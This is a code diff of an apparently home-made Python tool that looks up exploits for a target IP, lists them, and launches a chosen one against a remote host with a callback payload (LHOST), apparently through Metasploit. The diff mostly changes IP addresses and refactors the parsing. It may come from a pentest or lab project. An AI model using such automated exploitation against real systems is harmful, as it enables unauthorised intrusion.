@@ -55,7 +55,7 @@ def show_pwnguin():
     )
 
 
-IP = "127.0.0.1" # "192.168.1.45"
+IP = "192.168.1.45"
 CMD = "./explookup.sh " + IP + " >> /dev/null" # Sortie standard dans /dev/null pour la lisibilité, à changer
 EXPLOIT_LIST = "./exploit_list"
 
@@ -75,21 +75,37 @@ else:
 
 with open(EXPLOIT_LIST, "r+") as f:
     result = json.loads(f.read())
+
+# Create exploits from the list of research
+exploits = []
+for search in result:
+    exploits += search["RESULTS_EXPLOIT"]
+
 LOG("Imported exploit_list",logfile,"log")
 
-pprint.pprint(result[0]['RESULTS_EXPLOIT'][0]['Title'])
-
-if result:
-    titles=[]
-    for i in range(len(result)):
-        pwn = result[i]['RESULTS_EXPLOIT']
-        for k in range(len(pwn)):
-            titles.append(pwn[k]['Title'])
+if exploits:
+    titles = []
+    for k, pwn in enumerate(exploits):
+        titles.append([k, pwn["Title"]])
 else:
     LOG("Error 2 : Parsing error.",logfile,"err")
     print("[X] Error 2 : Parsing error.")
     exit(-2)
 LOG("Parsed ./exploit_list",logfile,"log")
+
+# pprint.pprint(result[0]['RESULTS_EXPLOIT'][0]['Title'])
+
+# if result:
+#     titles=[]
+#     for i in range(len(result)):
+#         pwn = result[i]['RESULTS_EXPLOIT']
+#         for k in range(len(pwn)):
+#             titles.append(pwn[k]['Title'])
+# else:
+#     LOG("Error 2 : Parsing error.",logfile,"err")
+#     print("[X] Error 2 : Parsing error.")
+#     exit(-2)
+# LOG("Parsed ./exploit_list",logfile,"log")
 
 
 # if result:
@@ -166,7 +182,7 @@ print("\n")
 
 
 exploit["RHOSTS"] = input("Remote HOST : ")
-payload["LHOST"] = "192.168.8.116"
+payload["LHOST"] = "192.168.1.86"
 
 print(exploit.execute(payload=payload))
 time.sleep(15)
